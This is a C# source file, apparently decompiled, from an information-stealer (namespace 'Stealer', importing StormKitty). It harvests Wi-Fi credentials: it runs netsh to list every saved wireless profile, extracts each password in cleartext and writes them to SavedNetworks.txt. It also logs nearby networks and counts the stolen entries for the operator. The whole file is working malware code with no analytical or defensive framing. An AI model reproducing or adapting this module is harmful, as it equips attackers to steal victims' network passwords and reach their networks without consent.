﻿using System;
using System.IO;
using System.Linq;
using StormKitty;

namespace Stealer
{
	// Token: 0x0200002A RID: 42
	internal sealed class Wifi
	{
		// Token: 0x060000BA RID: 186 RVA: 0x00006488 File Offset: 0x00004688
		private static string[] GetProfiles()
		{
			string[] array = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All", true).Split(new char[]
			{
				'\r',
				'\n'
			}, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
			}
			return array;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000064E2 File Offset: 0x000046E2
		private static string GetPassword(string profile)
		{
			return CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key", true).Split(new char[]
			{
				':'
			}).Last<string>().Trim();
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00006514 File Offset: 0x00004714
		public static void ScanningNetworks(string sSavePath)
		{
			string contents = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid", true);
			File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", contents);
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00006540 File Offset: 0x00004740
		public static void SavedNetworks(string sSavePath)
		{
			foreach (string text in Wifi.GetProfiles())
			{
				if (!text.Equals("65001"))
				{
					Counter.SavedWifiNetworks++;
					string password = Wifi.GetPassword(text);
					string contents = string.Concat(new string[]
					{
						"PROFILE: ",
						text,
						"\nPASSWORD: ",
						password,
						"\n\n"
					});
					File.AppendAllText(sSavePath + "\\SavedNetworks.txt", contents);
				}
			}
		}
	}
}
